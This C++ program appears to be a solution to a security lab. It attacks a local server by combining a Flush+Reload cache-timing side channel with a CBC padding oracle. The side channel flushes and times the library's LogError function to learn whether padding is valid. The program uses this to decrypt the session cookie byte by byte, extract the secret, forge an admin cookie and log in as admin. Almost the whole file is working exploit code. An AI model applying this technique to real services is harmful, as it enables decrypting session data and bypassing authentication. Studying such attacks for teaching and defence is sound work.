#include <iostream>
#include <iomanip>
#include <unistd.h>
#include <cstring>
#include <algorithm>
#include <numeric>
#include <cstdint>

#include "./simple_networking.h"
#include "./tinycrypt/tinycrypt.h"
#include "./base64.h"
#include "./config.h"

// ==========================================================================
// # Helper Functions
// ==========================================================================
using ByteVector = std::vector<std::byte>;

std::string StrFromByteVector(const ByteVector& vec) {
  std::string res;
  for (size_t i = 0; i < vec.size(); i++) {
    res += static_cast<char>(std::to_integer<int>(vec[i]));
  }
  return res;
}

ByteVector ByteVectorFromStr(const std::string& str) {
  ByteVector res;
  for (size_t i = 0; i < str.size(); i++) {
    res.push_back(std::byte{static_cast<unsigned char>(str[i])});
  }
  return res;
}

void PrintByteVector(const ByteVector& vec) {
  for (size_t i = 0; i < vec.size(); i++) {
    std::cout << std::hex << std::setw(2) << std::setfill('0')
        << (std::to_integer<int>(vec[i]) & 0xff);
  }
  std::cout << std::dec << std::endl;
}

void PrintLeakedCookieSecret(std::string leaked_cookie_secret) {
  std::cout << "[+] Leaked Cookie Secret: '" << leaked_cookie_secret
      << "'" << std::endl;
}

void PrintResponse(simple_networking::TCPClient* client) {
  std::cout << client->ReadMessage().ToString() << std::endl;
}

void RunInteractive(simple_networking::TCPClient* client) {
  std::cout << "Running interactive mode..." << std::endl;
  std::cout << "Type 'q' to exit and 'help' for help." << std::endl;

  while(true) {
    std::string msg;
    std::cout << "> ";
    std::getline(std::cin, msg);
    if (msg == "q") break;
    if (msg.size() == 0) continue;
    client->SendMessage(msg);

    simple_networking::ByteArray response_raw = client->ReadMessage();
    std::string response = response_raw.ToString();
    std::cout << response << std::endl;

  }
}


// ==========================================================================
// # Flush+Reload Side Channel Attack Implementation
// ==========================================================================

static void* g_log_error_addr = nullptr;
static uint64_t g_cache_threshold = 0;

// Inline assembly for cache operations
static inline void flush(void* addr) {
  asm volatile("clflush (%0)" :: "r"(addr) : "memory");
  asm volatile("mfence" ::: "memory");
}

static inline uint64_t probe(void* addr) {
  uint32_t start_lo, start_hi, end_lo, end_hi;

  asm volatile(
    "mfence\n\t"
    "rdtsc\n\t"
    : "=a"(start_lo), "=d"(start_hi)
  );

  volatile char tmp = *(volatile char*)addr;
  (void)tmp;

  asm volatile(
    "mfence\n\t"
    "rdtsc\n\t"
    : "=a"(end_lo), "=d"(end_hi)
  );

  uint64_t start = ((uint64_t)start_hi << 32) | start_lo;
  uint64_t end = ((uint64_t)end_hi << 32) | end_lo;

  return end - start;
}

bool init_side_channel() {
  // Get address of LogError directly since we link against tinycrypt
  // Cast function pointer to void* for Flush+Reload
  g_log_error_addr = reinterpret_cast<void*>(
      reinterpret_cast<uintptr_t>(&tinycrypt::LogError));

  if (!g_log_error_addr) {
    std::cerr << "[-] Could not get LogError address" << std::endl;
    return false;
  }

  std::cout << "[+] LogError at: " << g_log_error_addr << std::endl;
  return true;
}

void calibrate_threshold() {
  std::vector<uint64_t> cache_hit_times;
  std::vector<uint64_t> cache_miss_times;

  // Measure cache hits (access after access)
  for (int i = 0; i < 100; i++) {
    volatile char tmp = *(volatile char*)g_log_error_addr;
    (void)tmp;
    cache_hit_times.push_back(probe(g_log_error_addr));
  }

  // Measure cache misses (access after flush)
  for (int i = 0; i < 100; i++) {
    flush(g_log_error_addr);
    cache_miss_times.push_back(probe(g_log_error_addr));
  }

  // Sort and take median
  std::sort(cache_hit_times.begin(), cache_hit_times.end());
  std::sort(cache_miss_times.begin(), cache_miss_times.end());

  uint64_t median_hit = cache_hit_times[cache_hit_times.size() / 2];
  uint64_t median_miss = cache_miss_times[cache_miss_times.size() / 2];

  // Set threshold between hit and miss times
  g_cache_threshold = (median_hit + median_miss) / 2;

  std::cout << "[+] Cache timing calibration:" << std::endl;
  std::cout << "    Hit (median):  " << median_hit << " cycles" << std::endl;
  std::cout << "    Miss (median): " << median_miss << " cycles" << std::endl;
  std::cout << "    Threshold:     " << g_cache_threshold << " cycles" << std::endl;
}

// Returns true if LogError was called (cache hit = invalid padding)
bool was_log_error_called() {
  uint64_t time = probe(g_log_error_addr);
  return time < g_cache_threshold;
}

// Test if padding is valid using Flush+Reload
// Returns true if padding is VALID (LogError NOT called)
bool test_padding(simple_networking::TCPClient* client, const std::string& cookie) {
  const int NUM_SAMPLES = 7;
  int valid_count = 0;

  for (int sample = 0; sample < NUM_SAMPLES; sample++) {
    // Flush LogError from cache
    flush(g_log_error_addr);

    // Small delay to ensure flush completes
    for (volatile int i = 0; i < 100; i++) {}

    // Send login request with modified cookie
    client->SendMessage("login " + cookie);

    // Read response (ensures server processing is complete)
    client->ReadMessage();

    // Check if LogError was called
    if (!was_log_error_called()) {
      valid_count++;
    }
  }

  // Padding is valid if LogError was NOT called in most samples
  return valid_count > NUM_SAMPLES / 2;
}

// ==========================================================================
// # Padding Oracle Attack Implementation
// ==========================================================================

void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
  std::cout << "Running stored commands..." << std::endl;

  // Initialize Flush+Reload side channel
  if (!init_side_channel()) {
    std::cerr << "[-] Failed to initialize side channel" << std::endl;
    return;
  }

  // Calibrate cache timing threshold
  calibrate_threshold();

  // Step 1: Get encrypted cookie for "nobody"
  client->SendMessage("get-cookie");
  std::string cookie = client->ReadMessage().ToString();
  std::cout << "[+] Got cookie: " << cookie << std::endl;

  // Parse cookie format: <ciphertext_b64>.<hmac_b64>
  size_t dot_pos = cookie.find('.');
  if (dot_pos == std::string::npos) {
    std::cerr << "[-] Invalid cookie format" << std::endl;
    return;
  }

  std::string ct_b64 = cookie.substr(0, dot_pos);
  std::string hmac_b64 = cookie.substr(dot_pos + 1);

  // Decode ciphertext: IV (16 bytes) || CT (16 bytes)
  ByteVector iv_ct = base64::base64_decode(ct_b64);

  std::cout << "[+] Ciphertext length: " << iv_ct.size() << " bytes" << std::endl;
  std::cout << "[+] Starting padding oracle attack..." << std::endl;

  // The plaintext is "nobody-XXXXXXXX" + padding
  // "nobody-" = 7 bytes, secret = 8 bytes, padding = 1 byte (0x01)
  // Total: 16 bytes (one AES block)

  // Recovered intermediate state (AES_Decrypt(CT))
  std::vector<uint8_t> intermediate(16, 0);
  // Recovered plaintext
  std::vector<uint8_t> recovered(16, 0);

  // Padding oracle attack: decrypt byte by byte from position 15 to 0
  for (int pos = 15; pos >= 0; pos--) {
    uint8_t target_pad = 16 - pos;  // Padding value we want to achieve

    std::cout << "[*] Attacking byte " << pos << " (target padding: 0x"
              << std::hex << (int)target_pad << std::dec << ")..." << std::endl;

    // Prepare modified ciphertext
    ByteVector modified = iv_ct;

    // Set bytes after current position to produce valid padding
    for (int j = pos + 1; j < 16; j++) {
      // We want: intermediate[j] XOR modified_iv[j] = target_pad
      // So: modified_iv[j] = intermediate[j] XOR target_pad
      modified[j] = static_cast<std::byte>(intermediate[j] ^ target_pad);
    }

    bool found = false;
    for (int guess = 0; guess < 256 && !found; guess++) {
      // Modify IV byte at current position
      // We want: intermediate[pos] XOR modified_iv[pos] = target_pad
      // Try: modified_iv[pos] = guess
      modified[pos] = static_cast<std::byte>(guess);

      // Encode and create test cookie
      std::string mod_ct_b64 = base64::base64_encode(modified);
      std::string test_cookie = mod_ct_b64 + "." + hmac_b64;

      // Test if padding is valid
      if (test_padding(client, test_cookie)) {
        // Valid padding found!
        // intermediate[pos] = guess XOR target_pad
        intermediate[pos] = guess ^ target_pad;

        // Recover plaintext byte
        // plaintext[pos] = intermediate[pos] XOR original_iv[pos]
        uint8_t orig_iv = static_cast<uint8_t>(iv_ct[pos]);
        recovered[pos] = intermediate[pos] ^ orig_iv;

        char c = (char)recovered[pos];
        std::cout << "[+] Byte " << pos << " = 0x" << std::hex << std::setw(2)
                  << std::setfill('0') << (int)recovered[pos] << std::dec
                  << " ('" << (isprint(c) ? c : '?') << "')" << std::endl;
        found = true;
      }
    }

    if (!found) {
      std::cerr << "[-] Failed to recover byte " << pos << std::endl;
      // Try to continue anyway
    }
  }

  // Reconstruct the plaintext
  std::string plaintext(recovered.begin(), recovered.end());
  std::cout << "[+] Recovered plaintext: " << plaintext << std::endl;

  // Extract the cookie secret (bytes 7-14, after "nobody-")
  std::string leaked_cookie_secret = plaintext.substr(7, 8);
  PrintLeakedCookieSecret(leaked_cookie_secret);

  // Step 2: Forge admin cookie
  // Create "admin-<secret>" and encrypt it using server's encrypt command
  std::string admin_plaintext = "admin-" + leaked_cookie_secret;
  std::string admin_b64 = base64::base64_encode(ByteVectorFromStr(admin_plaintext));

  std::cout << "[+] Forging admin cookie..." << std::endl;
  client->SendMessage("encrypt " + admin_b64);
  std::string admin_cookie = client->ReadMessage().ToString();
  std::cout << "[+] Admin cookie: " << admin_cookie << std::endl;

  // Step 3: Login as admin
  std::string admin_login_request = "login " + admin_cookie;
  client->SendMessage(admin_login_request);
  PrintResponse(client);
}

int main([[maybe_unused]] int argc, [[maybe_unused]] char* argv[]) {
  bool interactive = argc == 2 && std::string(argv[1]) == "-i";

  simple_networking::TCPClient tcp_client(VERBOSE_NETWORK);
  try {
    int err = tcp_client.Connect("127.0.0.1",SERVER_PORT);
    if (err != 0) {
      std::cerr << "[-] Could not connect to server" << std::endl;
      return 1;
    }
    if (interactive) {
      RunInteractive(&tcp_client);
    } else {
      RunStoredCommands(&tcp_client);
    }
  } catch (std::runtime_error& e) {
    std::cerr << "[-] Connection error: " << e.what() << std::endl;
    return 1;
  }

  tcp_client.Disconnect();
  return 0;
}
